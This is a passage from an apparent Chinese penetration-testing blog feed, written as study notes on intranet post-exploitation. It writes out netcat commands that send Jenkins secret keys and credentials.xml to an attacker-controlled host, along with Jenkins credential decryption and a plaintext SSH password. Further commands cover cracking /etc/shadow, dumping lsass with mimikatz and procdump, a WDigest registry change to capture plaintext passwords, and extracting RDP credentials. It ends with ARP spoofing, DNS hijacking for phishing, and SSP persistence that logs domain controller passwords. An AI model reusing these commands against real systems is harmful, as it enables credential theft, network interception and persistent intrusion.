master.key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvp 1234 &amp;gt; hudson.util.Secret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvp 1234 &amp;gt; credentials.xml&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;肉鸡用nc将文件反向传输出去：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 172.16.250.128 1234 &amp;lt; /home/jenkins/secrets/hudson.util.Secret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 172.16.250.128 1234 &amp;lt; /home/jenkins/secrets/master.key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 172.16.250.128 1234 &amp;lt; /home/jenkins/credentials.xml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 6 ）破解密匙：&lt;br&gt;
项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NoZWV0ei9qZW5raW5zLWRlY3J5cHQ=&#34;&gt;https://github.com/cheetz/jenkins-decrypt&lt;/span&gt;&lt;br&gt;
 &lt;code&gt;python decrypt.py master.key hudson.util.Secret credentials.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（ 7 ）Database DMZ 权限获取&lt;br&gt;
密码横向： &lt;code&gt;ssh db_backup@172.16.250.50&lt;/code&gt; &lt;br&gt;
)uDvra{4UL^;r?*h&lt;br&gt;
 权限提升：getuid 及 sudo su&lt;/p&gt;
&lt;h4 id=&#34;密码获取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码获取&#34;&gt;#&lt;/a&gt; 密码获取&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Linux 密码获取及破解&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）密码读取 - 没啥用、适用版本少：&lt;br&gt;
项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==&#34;&gt;https://github.com/huntergregal/mimipenguin&lt;/span&gt;&lt;br&gt;
 使用方法：sh &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pbWlwZW5ndWluLnNo&#34;&gt;mimipenguin.sh&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 2 ）密码破解（SHA 512 居多）- 不容易破解：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据shadow获取root密码进行破解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;加密形式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;linux sha512crypt $6$, SHA512 (Unix)加密方式：hashcat -m 1800 sha512linux.txt p.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;linux sha256crypt $5$, SHA256 (Unix)加密方式：hashcat -m 7400 sha256linux.txt p.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;linux md5crypt, MD5 (Unix), Cisco-IOS$1$ (MD5)加密方式：hashcat -m 500 linuxmd5.txt p.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;linux下bcrypt &lt;span class=&#34;variable&#34;&gt;$2&lt;/span&gt;*$, Blowfish加密方式：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hashcat -m 3200 linuxmd5.txt p.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Windows 密码获取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;微软为了防止明文密码泄露发布了补丁 KB2871997，关闭了 Wdigest 功能。 当系统为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，Win dows-Mimikatz 会无法导出明文，此时可以通过修改注册表的方式抓取明文，但 需要用户重新登录后才能成功抓取。获取明文信息可以方便横向移动，可以有 更多的字典组合，明文要比 hash 要好用的多。&lt;/p&gt;
&lt;p&gt;（ 1 ）在线读&lt;/p&gt;
&lt;p&gt;工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=&#34;&gt;https://github.com/gentilkiwi/mimikatz&lt;/span&gt;&lt;br&gt;
`mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”``&lt;/p&gt;
&lt;p&gt;（ 2 ）离线读&lt;/p&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHJvY2R1bXA=&#34;&gt;https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在 2012server 后只能读取到 hash 而不能读取到明文密码，Procdump 是微软 官方的工具，可在命令行将 lsass 导出且杀软不会拦截，针对防护拦截 Mimikat z，用 procdump 将密码或 hash 转储到 lsass，在用本地的 mimikaztz 进行离线解析，或直接从从内存中将数据导出。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;转储 lsass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Procdump.exe -accepteula -ma lsass.exe lsass.dmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz.exe &amp;quot;sekurlsa::minidump lsass.DMP&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sekurlsa::logonPasswords full&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）解决高版本&lt;/p&gt;
&lt;p&gt;修改注册表 + 强制锁屏 + 等待系统管理员重新登录 + 截取明文密码&lt;br&gt;
修改注册表来让 Wdigest Auth 保存明文口令方式&lt;br&gt;
 &lt;code&gt;shell reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1&lt;/code&gt; &lt;br&gt;
 再次使用 mimikatz 时，将可以成功导出明文票据&lt;/p&gt;
&lt;p&gt;（ 4 ）HASH 破解&lt;br&gt;
方法：hashcat 工具 cmd5、 somd5 在线网站&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;hashcat使用方法如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;字典破解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.\hashcat.exe -a 0 -m 1000 .\hash.txt .\pass.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;暴力破解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c?l?l?l?l?l?s?s?s?d?d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-m 密文类型 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-a 破解类型 ?l 小写 ?s 符号 ?d 数字&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 5 ）RDP 凭据抓取&lt;br&gt;
 mstsc 连接过其他机器，如果选择保存凭剧，则可以通过以下方式导出 rdp 密码。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看连接记录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmdkey /list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查找本地的Credentials&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir /a %userprofile%\appdata\local\microsoft\credentials\*Credentials记录guidMasterKey值:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\ local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到guidMasterKey对应的MasterKey:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::dpapi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;system权限解密指定的MasterKey凭据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credential s\ 5FBB2585F99BA05366F08E52F1C1740B /masterkey:f70e1a641096f1b63731d571b43b33aaf009f6af5a3352504e6ddb3cd158f17eec2d541f18b8289ebf547d871dfb257a6bbbd5232550eb6f26a06d39378da4a5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;凭据导出:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=&#34;&gt;https://github.com/WazeHell/sam-the-admin&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;python sam_the_admin.py test0/‘xiaodi:admin!@#45’ -dc-ip 192.168.10.20 -shell&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;父域子域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#父域子域&#34;&gt;#&lt;/a&gt; 父域子域&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-008.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;设置父子域的时候，先设置父域及其控制的两台域用户电脑。对三台电脑 分别配置 ip 地址，并解析到父域的 ip 上，修改三者的计算机名称。对父域的服 务器管理做设置，选择添加角色和功能向导，服务器角色配置中选择域服务， 完成之后将此计算机提升为域控，并添加新林，设定自定义域，netbios 名称等。&lt;/p&gt;
&lt;p&gt;通过在父域上添加新的角色，并使普通计算机以域用户身份加入域即可加 入该父域。子域的设置时，需要在父域上先开启 DNS 的一个开关，然后将子域 按照父域的设置方式添加角色和功能向导，区别在于设置为域控方式为加入域 为现有林，林为父域的信息，并自定义相关内容之后即可成功设置为子域。&lt;/p&gt;
&lt;p&gt;子域控制的计算机，其 dns 解析地址需要设置为子域控的 ip 地址。同父域 管辖的计算机一样，通过给子域管辖的计算机设置新的用户名供其登录。修改 子域控的 dns 解析，首选本身，备选为父域控。而后将最后一台电脑加入到子 域即可。&lt;/p&gt;
&lt;h4 id=&#34;局域网渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#局域网渗透&#34;&gt;#&lt;/a&gt; 局域网渗透&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;单向欺骗和双向欺骗&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;单向欺骗：攻击机伪造数据包后本应该传输给靶机的数据错误的传输给攻 击机，使靶机得不到服务器的响应数据，甚至根本无法将数据包发送出局域网。&lt;/p&gt;
&lt;p&gt;双向欺骗：攻击机一直发送伪造的数据包，欺骗网关自己是靶机，欺骗靶 机自己是网关，同时开启路由转发功能，就可以让靶机在正常上网的情况下截 获网络数据包，所有数据都会经过攻击机再转发给靶机。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单向断网限制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;科来网络分析系统，科来数据包生成器，封装数据包，给靶机造成假象，认为攻击机才是网关地址，造成靶机无法正常上网。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;双向劫持数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Arpspoof Wireshark 科来网络分析系统&lt;br&gt;
 Arpspoof Windows:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsYW5kYXUvYXJwc3Bvb2Y=&#34;&gt;https://github.com/alandau/arpspoof&lt;/span&gt;&lt;br&gt;
Arpspoof Linux:apt-get install dsniff&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启转发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果不开启转发，流量被检测到之后，对方无法正常通讯网络&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启欺骗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;arpspoof -i eth0 -t 192.168.1.9 -r 192.168.1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;- i 指定进行arp攻击的网卡、-t 目标主机IP、-r 进行双向攻击、最后为网关的IP地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;WireShark&amp;amp;科来网络分析系统：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;分析是否能够捕获到双向劫持靶机上的流量 ip.addr==192.168.1.9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;双向 DNS 劫持配合钓鱼：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 kali 自带的 ettercap -G 进行 dns 劫持，将目标主机访问特定 url 地址的 流量解析到 ettercap 配置文件中规定的解析地址，一般会在 kali 上开启 apache 服 务进行钓鱼。注意需要清除靶机上的 dns 缓存、浏览器缓存等。&lt;/p&gt;
&lt;p&gt;设置劫持网卡、扫描网卡存活 IP、选择攻击目标 IP、启用 ARP 监听模式、 设置 DNS 劫持规则、启用 DNS 劫持插件。&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
        <title>XD22 12 权限维持</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
        <content type="html">&lt;h3 id=&#34;内网域维持权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网域维持权限&#34;&gt;#&lt;/a&gt; 内网域维持权限&lt;/h3&gt;
&lt;p&gt;参考资料：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGN4YmxvZ3MvcC8xNDIxNjUyNS5odG1s&#34;&gt;https://www.cnblogs.com/lcxblogs/p/14216525.html&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;验证dll加载-ssp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证dll加载-ssp&#34;&gt;#&lt;/a&gt; 验证 DLL 加载 SSP&lt;/h4&gt;
&lt;p&gt;攻防实战中，靶机很难会重启，攻击者重启的话风险过大，因此可以在靶机上把两个方法相互结合起来使用效果比较好，尝试利用把生成的日志密码文件发送到内网被控机器或者临时邮箱。&lt;/p&gt;
&lt;p&gt;（ 1 ）但如果域控制器重启，被注入内存的伪造的 SSP 将会丢失。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导出密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;misc::memssp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;记录登录的账号密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\System32\mimilsa.log &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）使用此方法即使系统重启，也不会影响到持久化的效果。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;mimilib&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimilib.dll 传到目标域控的c:\windows\system32\目录下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改注册表，重启生效&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg query hklm\system\currentcontrolset\control\lsa\ /v &amp;quot;Security Packages&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg add &amp;quot;HKLM\System\CurrentControlSet\Control\Lsa&amp;quot; /v &amp;quot;Security Packages&amp;quot; /d &amp;quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&amp;quot; /t REG_MULTI_SZ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;记录账号密码文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c:\windows\system32\kiwissp.log &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;验证dll加载-hook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证dll加载-hook&#34;&gt;#&lt;/a&gt; 验证 DLL 加载 HOOK&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3doME5zcS9Ib29rUGFzc3dvcmRDaGFuZ2U=&#34;&gt;https://github.com/wh0Nsq/HookPasswordChange&lt;/span&gt;&lt;br&gt;
